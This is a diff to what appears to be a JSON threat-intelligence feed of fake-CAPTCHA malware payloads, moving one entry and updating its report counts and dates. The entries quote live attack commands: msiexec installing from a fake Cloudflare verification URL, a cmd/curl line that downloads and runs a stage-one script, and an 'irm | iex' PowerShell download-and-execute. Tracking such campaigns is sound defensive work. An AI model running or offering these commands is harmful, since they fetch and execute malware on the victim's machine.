@@ -942,6 +942,21 @@
     ]
   },
   {
+    "Pattern": "msiexec /i <URL> msiex...\n...ps://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i <URL> Verif...\nFake",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-15T20:17:10.453000+00:00",
+    "LastSeen": "2026-11-15T21:31:07.231000+00:00",
+    "ReportIds": [
+      "cmwi9zysw0zmv0omltdaab4by",
+      "cmwibrmxl0zoa0omlbyzngmgj",
+      "cmwicn28d0ztc0oml2lvkp9eu"
+    ],
+    "PayloadExamples": [
+      "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
+    ]
+  },
+  {
     "Pattern": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
@@ -1123,19 +1138,6 @@
     ],
     "PayloadExamples": [
       "irm 'https://err12[.]online/MPN34CUssTOxul1S=9aa1f611e4d27fce' | iex;"
-    ]
-  },
-  {
-    "Pattern": "msiexec /i <URL> msiex...\n...ps://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i <URL> Verif...\nFake",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-15T20:17:10.453000+00:00",
-    "LastSeen": "2026-11-15T20:17:10.453000+00:00",
-    "ReportIds": [
-      "cmwi9zysw0zmv0omltdaab4by"
-    ],
-    "PayloadExamples": [
-      "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
     ]
   },
   {
